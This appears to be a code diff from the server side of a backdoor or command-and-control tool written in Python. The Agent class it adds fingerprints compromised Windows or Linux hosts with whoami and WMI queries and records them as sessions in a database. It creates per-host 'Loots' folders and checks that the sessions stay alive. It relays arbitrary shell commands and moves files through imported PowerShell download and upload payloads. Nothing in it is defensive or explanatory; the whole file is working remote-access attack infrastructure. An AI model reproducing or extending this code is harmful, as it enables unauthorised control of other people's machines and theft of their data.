@@ -1,55 +1,173 @@
-from .handle_agent import *
 from .common import *
 from .settings import HTTPFileServerSettings
+from .session_manager import SessionManager
+from .database import AgentsDB
 from .logging import AutoComplete
 from .payloads import powershell_download_file, powershell_upload_file, powershell_upload_file_ssl, powershell_download_file_ssl
 
 from http.server import BaseHTTPRequestHandler
 from base64 import b64decode
 from tqdm import tqdm
-import socket, os, re, time
+import socket, os, re, time, threading
 
 
 
 class Agent:
     
-    def __init__(self, conn, user):
+    def __init__(self, connection):
         
         self.path = None
-        self.conn         = conn
-        self.user         = user
-        self.buff         = 4096
-        self.session_id   = None
-        self.invalid_commands = ["ping"]
+        self.conn = connection
+        self.buff = 4096
 
-    
+
+    def get_agent_info(self, agent_ip):
+        try:
+
+            self.send_command("(Get-WmiObject -Class Win32_OperatingSystem).Caption")
+            response = self.receive_all()
+
+            if "Windows" not in response:
+
+                os_type = "Linux"
+
+                self.send_command("hostname && whoami")
+                response = self.receive_all().split('\n')
+
+                hostname = response[0].strip('\r').upper()
+                user = response[1].strip('\r')
+
+            else:
+
+                os_type = "Windows"
+
+                self.send_command("whoami")
+                response = self.receive_all()
+
+                response = response.split('\n')[0].split('\\')
+                hostname = response[0].upper()
+                user = response[1].strip('\r')
+
+            return user, hostname, os_type
+
+
+        except ConnectionResetError as e:
+            print(f"\n\n{c.alt} Failed to establish backdoor session with {c.Y}{agent_ip}{c.RS}: Connection reset by peer")
+            return
+
+        except ConnectionError as e:
+            print(f"\n\n{c.alt} Failed to establish backdoor session with {c.Y}{agent_ip}{c.RS}: Connection error")
+            return
+
+        except Exception as e:
+            print(f"\n\n{c.alt} Failed to establish backdoor session with {c.Y}{agent_ip}{c.RS}: Unknown error occurred")
+            return
+
+
+
+    def save_agent(self, agent_ip):
+
+        agent_port = agent_ip[1]
+        agent_ip = agent_ip[0]
+
+        agents_db = AgentsDB()
+
+        session_id = SessionManager.createSessionId()
+        SessionManager.agents_connections[session_id] = self.conn
+
+        try:
+            user, hostname, os_type = self.get_agent_info(agent_ip)
+        except:
+            return
+
+        user_and_hostname = f"{hostname}/{user}"
+
+        print(f"\n\n{c.info} Connection with {c.G}{agent_ip}:{agent_port}{c.RS} established")
+
+        AutoComplete.defaultCommands.append(session_id)
+        loot_path = f"Loots/{hostname}"
+
+        try:
+
+            if not os.path.exists(loot_path):
+                os.makedirs(loot_path)
+
+            SessionManager.loots_paths[session_id] = loot_path
+
+        except OSError:
+
+            print(f"{c.alt} An error occurred while trying to create loot directory")
+
+
+        agents_db.add_agent(session_id, agent_ip, os_type, user_and_hostname, "Active")
+        threading.Thread(target=self.is_agent_alive, name="is_agent_alive_thread").start()
+
+
+
+    @staticmethod
+    def is_agent_alive():
+
+        agents_db = AgentsDB()
+
+        while True:
+            time.sleep(1)
+
+            for session_id, conn in SessionManager.agents_connections.items():
+                try:
+                    error = conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
+
+                    if error != 0:
+                        agents_db.update_agent_status(session_id, "Inactive")
+                        user = agents_db.get_agent_user(session_id)
+                        print(f"\n\n{c.alt} Connection with Agent {c.RS}{c.O}{user}{c.RS} lost")
+                        pass
+
+                except socket.timeout:
+                    pass
+
+                except ConnectionError:
+                    agents_db.update_agent_status(session_id, "Inactive")
+
+
     def receive_all(self):
         
         data = b''
-        
+
         while True:
-            
+
             buff = self.conn.recv(self.buff)
-            
+
             if not buff:
                 break
             data += buff
-            
+
             if len(buff) < self.buff:
                 break
-            
+
         return data.decode('utf-8')
-    
-        
+
+
+
+    def send_command(self, command):
+
+        try:
+
+            self.conn.send(command.encode('utf-8'))
+
+        except socket.timeout:
+
+            print(f"\n{c.alt} Connection timeout")
+            self.close_shell()
+
+
     def close_shell(self):
         
         self.conn = None
-        self.user = None
-
         print(Message.shellClosed)
 
 
-    def create_path(self, response):
+    @staticmethod
+    def create_path(response):
 
         valid_path = re.search(r'([A-Za-z]:\\[^>\n]*>)', response)
         if valid_path:
@@ -74,8 +192,8 @@ class Agent:
         else:
             return response.replace('>', '').strip()
     
-    
-    def update_session_commands(self, command_executed, command_output):
+    @staticmethod
+    def update_session_commands(command_executed, command_output):
         
         commands = command_executed.split()
         for command in commands:
@@ -86,8 +204,8 @@ class Agent:
             if command not in AutoComplete.sessionsCommands:
                 AutoComplete.sessionsCommands.append(command)
                                     
-         
-    def get_file_names(self, response):
+    @staticmethod
+    def get_file_names(response):
 
         pattern = r'([-\w]+(?:\.\w+)?)(?=\s{2,})'
         matches = re.findall(pattern, response)
@@ -96,17 +214,6 @@ class Agent:
         
         return file_names
 
-    
-    def send_command(self, command):
-        
-        try:
-            
-            self.conn.send(command.encode('utf-8'))
-        
-        except socket.timeout:
-            
-            print(f"\n{c.alt} Connection timeout")
-            self.close_shell()
 
                 
     def shell(self):
@@ -130,16 +237,7 @@ class Agent:
                     
                     self.close_shell()
                     break
-                
-                elif main_arg in self.invalid_commands:
-                    
-                    confirm = input(f"\n{c.alt} This command can interrupt shell function, execute anyway (y/n): ")
-                    
-                    if confirm in ["y", "yes"]:
-                        continue
-                    
-                    else:
-                        continue
+
                 
                 elif len(main_arg) == 0:
                     continue
@@ -206,7 +304,8 @@ class Agent:
                 print("\n")
                 self.close_shell()
                 break
-            
+
+
     def file_path_exists(self, file_path):
                 
         check_file_path = f"Test-Path -Path {file_path}"
@@ -221,7 +320,6 @@ class Agent:
         
         else:
             return False
-                
 
                     
     def upload_file(self, local_path, upload_path):
@@ -248,15 +346,13 @@ class Agent:
                 upload_path = upload_path + "\\"
                 
             upload_file_name = os.path.basename(upload_path.replace("\\", "/"))
-            
+
             if upload_file_name == "":
                 upload_file_name = local_file_name
 
             upload_path = upload_path.replace(upload_file_name, '')
 
             if self.file_path_exists(upload_path):
-                                
-                upload_path += upload_file_name
                 
                 server_url = f"{protocol}://{lhost}:{HTTPFileServerSettings.bind_port}/{local_file_name}"
                 
@@ -382,7 +478,7 @@ class FileHandler(BaseHTTPRequestHandler):
                     
         print("")                   
         pr_bar = tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {c.G}{file_name}{c.RS}", ascii=True, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} {postfix}", colour='green')
-                    
+
         with open(file_name, 'wb') as f:
             
             for byte in range(0, file_size, 1024):
@@ -396,7 +492,6 @@ class FileHandler(BaseHTTPRequestHandler):
                     
         self.send_response(200)
         self.end_headers()
-
                  
 
     def log_message(self, format, *args):
